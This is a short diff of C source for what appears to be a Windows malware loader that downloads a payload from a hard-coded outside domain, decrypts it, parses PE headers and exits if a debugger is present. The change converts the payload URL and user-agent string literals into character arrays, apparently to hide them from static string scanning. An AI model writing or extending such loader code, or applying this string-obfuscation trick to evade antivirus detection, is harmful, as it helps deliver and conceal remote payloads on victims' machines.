@@ -54,7 +54,7 @@ BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
 BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize)
 {
 	//printf("[+] Downloading payload\n");
-	LPCSTR cUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
+	char cUserAgent[] = { 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/', '1', '2', '2', '.', '0', '.', '0', '.', '0', ' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3', '7', '.', '3', '6', '\0' };
 	HINTERNET hInternet = NULL;
 	HINTERNET hInternetFile = NULL;
 	PBYTE lBuffer = NULL;
@@ -548,7 +548,7 @@ int main(int argc, char* argv[])
 	PBYTE pFileBuffer = NULL;
 	DWORD dwFileSize = 0;
 	PE_HEADERS peHeaders = { 0 };
-	LPCSTR sURL = "https://bullworthless.com/19461b00-56f8-11ee-94ef-128911d0d8fb/0590a5a0-941e-4401-a0c1-99c3b5196814.txt";
+	char sURL[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'b', 'u', 'l', 'l', 'w', 'o', 'r', 't', 'h', 'l', 'e', 's', 's', '.', 'c', 'o', 'm', '/', '1', '9', '4', '6', '1', 'b', '0', '0', '-', '5', '6', 'f', '8', '-', '1', '1', 'e', 'e', '-', '9', '4', 'e', 'f', '-', '1', '2', '8', '9', '1', '1', 'd', '0', 'd', '8', 'f', 'b', '/', '0', '5', '9', '0', 'a', '5', 'a', '0', '-', '9', '4', '1', 'e', '-', '4', '4', '0', '1', '-', 'a', '0', 'c', '1', '-', '9', '9', 'c', '3', 'b', '5', '1', '9', '6', '8', '1', '4', '.', 't', 'x', 't', '\0' };
 
 	if (IsDbgrPresent())
 		return -1;
